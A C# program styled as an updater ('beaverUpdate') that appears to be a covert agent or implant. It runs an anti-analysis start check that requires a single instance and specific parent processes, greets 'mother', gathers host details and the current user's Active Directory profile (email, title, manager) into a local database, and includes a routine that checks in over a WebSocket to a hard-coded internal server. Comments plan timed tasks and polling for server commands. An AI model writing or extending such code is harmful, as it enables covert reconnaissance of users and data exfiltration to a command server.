using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.WebSockets;
using BeaverUpdate;
using VoidSerpent;

namespace beaverUpdate
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // protected start: one instance, specific parents
            if (!BetrayalIsASymptom.protectedStart())
            {
                Console.WriteLine("Unable to run due to security measures.");
                return;
            }

            // Ensure we're tracking state
            var db = new DatabaseManager("syncstate.db");

            // Say hello to mother. 
            Console.WriteLine("Hello mother!");
            ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();

            // UserInfo
            string userJob = db.GetJobStatus("userinfo");
            List<string> userJobDone = new List<string>
            {
                "collected",
                "completed",
                "failed"
            };
            if (!userJobDone.Contains(userJob))
            {
                Console.WriteLine($"Collecting user job info: {userJob}");
                try
                {
                    // Get the current user's active directory info, store to local db, record task
                    DirectoryHelper.UserInfo userInfo = DirectoryHelper.GetUserInfo();
                    db.DirectoryEntry(userInfo.UserName, userInfo.Name, userInfo.Email, userInfo.Title, userInfo.Department, userInfo.Manager);
                    db.JobEntry(name: "userinfo", status: "collected");
                }
                catch
                {
                    Console.WriteLine("Marking task failed");
                    db.JobEntry(name: "userinfo", status: "failed");
                }
            } else
            {
                Console.WriteLine($"Skipped user check as previous attempt was {userJob}");
            }

            Console.WriteLine($"Greetings {hostInfo.UserName} from {hostInfo.ComputerName}");
            //await SendMessage("bugz", $"Greetings from {hostInfo.UserName} on {hostInfo.ComputerName}!");
            var jobdb = db.GetJobs();
            foreach (var job in jobdb )
            {
                Console.WriteLine($"Jobname: {job}");
            }
            // Start working through pending tasks on a timer, in a thread
            // :memsql: - lastTask(#), lastRun(time)
            // have numbered list of tasks, iterate in loop only start next # if it's been 20 minutes since last run
            // look for server messages between?

        }

        // supplementary
        

        static async Task SendMessage(string clientName, string message)
        {
            using (ClientWebSocket webSocket = new ClientWebSocket())
            {

                Uri serverUri = new Uri($"ws://192.168.1.202/checkupdate?client={clientName}");
                try
                {
                    await webSocket.ConnectAsync(serverUri, CancellationToken.None);
                    Console.WriteLine("Connected to WebSocket server.");

                    // Create the JSON payload for the "update" event
                    string jsonPayload = $"{{\"event\": \"message\", \"message\": \"{message}\"}}";
                    byte[] sendBuffer = Encoding.UTF8.GetBytes(jsonPayload);

                    // Send the message to the WebSocket server
                    await webSocket.SendAsync(new ArraySegment<byte>(sendBuffer), WebSocketMessageType.Text, true, CancellationToken.None);
                    Console.WriteLine("Sent 'message' event with message 'check-in'.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
    }    
}
